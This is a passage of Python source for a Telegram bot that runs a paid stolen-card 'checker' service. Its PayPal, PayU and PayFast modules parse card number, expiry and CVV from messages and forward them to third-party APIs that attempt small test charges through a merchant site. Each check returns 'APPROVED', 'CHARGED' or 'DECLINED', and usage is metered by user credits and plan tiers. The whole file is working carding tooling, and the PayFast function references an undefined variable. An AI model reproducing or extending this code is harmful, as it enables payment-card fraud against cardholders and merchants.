𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗣𝗮𝘆𝗽𝗮𝗹 0.10$</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await p1_check_card_paypal(card_details, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>Error checking card:</b>"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            error_msg = f"⚠️ <b>Error:</b> <code>{str(e)}</code>"
            await checking_message.edit_text(error_msg, parse_mode="HTML")
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())



# ============================================================
# MODULE: py
# ============================================================
# Configure logging
# Add this near the top after imports
last_command_time = {}
# API endpoint
API_BASE_URL = PAYU_API_URL

def py_parse_card_details(card_string: str) -> Optional[tuple]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: 4169161410569379/12|16|931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379/12|16/931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379/12/16/931
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379|12/16|931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379|12/16/931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12|16|931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379:12|16/931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12/16|931
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def py_extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        # Pattern: 4169161410569379/12|16|931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379/12|16/931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379/12/16/931
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379|12/16|931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379|12/16/931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12|16|931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379:12|16/931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12/16|931
        r'(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def check_card_payu(card_details: str, user_info: dict) -> Optional[str]:
    """
    Check card details using PayU 0.29$ API asynchronously with aiohttp.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Formatted response string or None if there was an error
    """
    # Parse card details
    parsed = py_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /py card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Check if it's an Amex card (starts with 34 or 37)
    if card_number.startswith('34') or card_number.startswith('37'):
        return "⚠️ <b>American Express (Amex) cards are not supported.</b>\n\n<i>Please use a Visa, Mastercard, or other supported card type.</i>"
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Construct the API URL with the correct format - UPDATED
    card_string = f"{card_number}|{month}|{year}|{cvv}"
    api_url = f"{API_BASE_URL}/gateway=autostripe/key=Blackxcard/site=kabusvuya.com/cc={card_string}"
    
    try:
        # Create an aiohttp session for async HTTP requests
        async with aiohttp.ClientSession() as session:
            # Make API request asynchronously with a 60-second timeout
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"}, timeout=aiohttp.ClientTimeout(total=60)) as response:
                                api_response = await response.json()
        
        # Format and return the response
        return format_response_payu(api_response, user_info, card_details, brand, issuer, country_name, country_flag)
    
    except Exception as e:
        # Log the error instead of showing it to the user
        logger.error(f"Error checking card with PayU 0.29$ API: {e}")
        # Return a generic error message to the user
        return "⚠️ <b>Unable to process your request at the moment.</b>\n\n<i>Please try again later.</i>"

def format_response_payu(api_response: dict, user_info: dict, card_details: str, 
                        brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    """
    Format the API response into a beautiful message with emojis for PayU 0.29$.
    
    Args:
        api_response: Dictionary containing the API response
        user_info: Dictionary containing user information
        card_details: Full card details string
        brand: Card brand from BIN lookup
        issuer: Bank name from BIN lookup
        country_name: Country name from BIN lookup
        country_flag: Country emoji from BIN lookup
        
    Returns:
        Formatted string with emojis
    """
    # Extract response fields - UPDATED to match new API structure
    status = api_response.get("status", "")
    response_text = api_response.get("response", api_response.get("message", ""))
    
    # For PayU 0.29$, status is directly from API and response is the value
    status_text = status
    response_text = response_text
    
    # Determine status style based on status content
    status_lower = status.lower()
    if "approved" in status_lower:
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
    elif "declined" in status_lower:
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
    else:
        status_style = f"<b>{status_text.upper()}</b> 🔥"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Get user credits and format display
    user_credits = get_user_credits(user_id)
    if user_credits is None:
        credits_display = "Error"
    elif user_credits == float('inf'):
        credits_display = "Infinite😎"  # Display for unlimited credits
    else:
        credits_display = str(user_credits)

    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Add credits info only if user has 0 credits and not unlimited
    credits_warning = ""
    if user_credits is not None and user_credits <= 0 and user_credits != float('inf'):
        credits_warning = f"\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
    
    # Combine all parts - UPDATED gateway name
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗣𝗮𝘆𝗨 0.29$</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{response_text}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response

# This function will be called from main.py
async def handle_py_command(update, context):
    """
    Handle the /py command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check if user has an active plan (not Trial)
    if user_tier == "Trial":
        await update.message.reply_text(
            "⚠️ <b>This command is only available for users with an active plan.</b>\n\n"
            "<i>Upgrade your plan to use this gateway.</i>",
            parse_mode="HTML"
        )
        return
    
    # Check cooldown for users
    current_time = datetime.now()
    if user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=5):  # Shorter cooldown for paid users
            remaining_seconds = 5 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>",
                parse_mode="HTML"
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = py_extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /py card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /py</i>", 
            parse_mode="HTML"
        )
        return
    
    # Parse card details to check if it's an Amex card
    parsed = py_parse_card_details(card_details)
    if parsed:
        card_number, month, year, cvv = parsed
        
        # Check if it's an Amex card (starts with 34 or 37)
        if card_number.startswith('34') or card_number.startswith('37'):
            await update.message.reply_text(
                "⚠️ <b>American Express (Amex) cards are not supported.</b>\n\n"
                "<i>Please use a Visa, Mastercard, or other supported card type.</i>",
                parse_mode="HTML"
            )
            return
    
    # Get user credits
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    if not has_credits:
        # Still allow the request but show a warning
        progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
Gateway: <i>PayU 0.29$</i>
<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. This will be your last check.</i>"""
    else:
        # Create a normal progress message without credit info
        progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗣𝗮𝘆𝗨 0.29$</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time immediately
    last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await check_card_payu(card_details, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>Unable to process") and not result.startswith("⚠️ <b>American Express"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            # Log the error instead of showing it to the user
            logger.error(f"Error in background check for user {user_id}: {e}")
            # Show a generic error message to the user
            error_msg = "⚠️ <b>Unable to process your request at the moment.</b>\n\n<i>Please try again later.</i>"
            await checking_message.edit_text(error_msg, parse_mode="HTML")
    
    # Schedule the background task without awaiting it
    asyncio.create_task(background_check())



# ============================================================
# MODULE: pf
# ============================================================
# Configure logging

# Create a thread pool executor for background tasks
executor = ThreadPoolExecutor(max_workers=100)

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

def pf_luhn_check(card_number: str) -> bool:
    """
    Validate a credit card number using the Luhn algorithm.
    
    Args:
        card_number: The credit card number to validate
        
    Returns:
        True if the card number is valid, False otherwise
    """
    # Remove any spaces or dashes from the card number
    card_number = card_number.replace(' ', '').replace('-', '')
    
    # Check if the card number contains only digits
    if not card_number.isdigit():
        return False
    
    # Check if the card number has a valid length (13-19 digits)
    if len(card_number) < 13 or len(card_number) > 19:
        return False
    
    # Convert the card number to a list of integers
    digits = [int(d) for d in card_number]
    
    # Starting from the rightmost digit, double every second digit
    # If doubling results in a two-digit number, sum the digits
    for i in range(len(digits) - 2, -1, -2):
        digits[i] = digits[i] * 2
        if digits[i] > 9:
            digits[i] = digits[i] % 10 + 1
    
    # Sum all the digits
    total = sum(digits)
    
    # If the total is a multiple of 10, the card number is valid
    return total % 10 == 0

def pf_get_credit_card_details(card_string):
    """Parse card details from various formats"""
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return {
                'number': card_number.replace(' ', ''),  # Remove spaces if any
                'exp_month': month,
                'exp_year': year,
                'cvc': cvv
            }
    
    return None

def pf_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def pf_extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def check_card_with_payfast(card_details: str, user_info: Dict) -> Optional[Dict]:
    """
    Check card details using the PayFast API.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Dictionary with card details and API response or None if there was an error
    """
    # Parse card details
    parsed = pf_parse_card_details(card_details)
    if not parsed:
        return {
            "card_details": card_details,
            "error": "Invalid card format"
        }
    
    card_number, month, year, cvv = parsed
    
    # Validate the card number using Luhn algorithm
    if not pf_luhn_check(card_number):
        return {
            "card_details": card_details,
            "error": "Invalid card number (failed Luhn check)"
        }
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Prepare the API URL with the card details
    # Format the card details for the PayFast API
    formatted_card = f"{card_number}|{month}|{year}|{cvv}"
    api_url = f"{PAYFAST_API_URL}/gateway=autostripe/key=Blackxcard/site=kabusvuya.com/cc={formatted_card}"
    
    try:
        # Create a session for the request
        timeout = aiohttp.ClientTimeout(total=60)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Make the API request
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"}) as response:
                if response.status != 200:
                    return {
                        "card_details": card_details,
                        "error": "API request failed"
                    }
                
                # Parse the JSON response
                api_response = await response.json()
                
                # Check if we got a valid response
                if not api_response:
                    return {
                        "card_details": card_details,
                        "error": "Empty response from API"
                    }
                
                # Extract response fields
                status = api_response.get("status", "unknown")
                message = api_response.get("response", api_response.get("message", "No response message"))
                
                return {
                    "card_details": card_details,
                    "card_number": card_number,
                    "month": month,
                    "year": year,
                    "cvv": cvv,
                    "api_response": {
                        "status": status,
                        "response": message,
                        "errors": errors
                    },
                    "brand": brand,
                    "issuer": issuer,
                    "country": country_name,
                    "country_flag": country_flag
                }
    
    except asyncio.TimeoutError:
        return {
            "card_details": card_details,
            "error": "Request timed out. Please try again."
        }
    except aiohttp.ClientError:
        return {
            "card_details": card_details,
            "error": "Network error. Please try again."
        }
    except Exception:
        return {
            "card_details": card_details,
            "error": "An unexpected error occurred. Please try again."
        }

def format_response_payfast(result: dict, user_info: dict) -> Tuple[str, str]:
    """
    Format the API response into a beautiful message with emojis for PayFast gateway.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Tuple of (formatted string, status category)
    """
    if "error" in result:
        error_msg = result.get('error', 'Unknown error')
        
        # Create a more visually appealing error message
        formatted_error = f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙀𝙧𝙧𝙤𝙧 𝘿𝙚𝙩𝙚𝙘𝙩𝙚𝙙</b> ⚠️

<a href='https://t.me/rev3rsex'>💳</a> <b>𝘾𝙖𝙧𝙙:</b> <code>{result.get('card_details', 'Unknown')}</code>

<a href='https://t.me/rev3rsex'>📝</a> <b>𝙍𝙚𝙖𝙨𝙤𝙣:</b> <i>{error_msg}</i>

<a href='https://t.me/rev3rsex'>💡</a> <b>𝙏𝙞𝙥:</b> <i>Please check your card details and try again.</i>"""
        
        return formatted_error, "error"
    
    api_response = result.get("api_response", {})
    card_details = result.get("card_details", "")
    brand = result.get("brand", "N/A")
    issuer = result.get("issuer", "N/A")
    country_name = result.get("country", "Unknown")
    country_flag = result.get("country_flag", "")
    
    # Extract response fields
    status = api_response.get("status", "")
    message = api_response.get("response", api_response.get("message", ""))
    errors = api_response.get("errors", [])
    
    # Check for the specific success message
    success_message = "charged"
    if success_message.lower() in message.lower():
        status_style = "<b>𝘾𝙃𝘼𝙍𝙂𝙀𝘿</b> 🔥"
        status_category = "charged"
    else:
        # Default to declined status
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
        status_category = "declined"
        
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗣𝗮𝘆𝗙𝗮𝘀𝘁 0.30$</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response, status_category

# This function will be called from main.py
async def handle_pf_command(update, context):
    """
    Handle the /pf command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = pf_extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
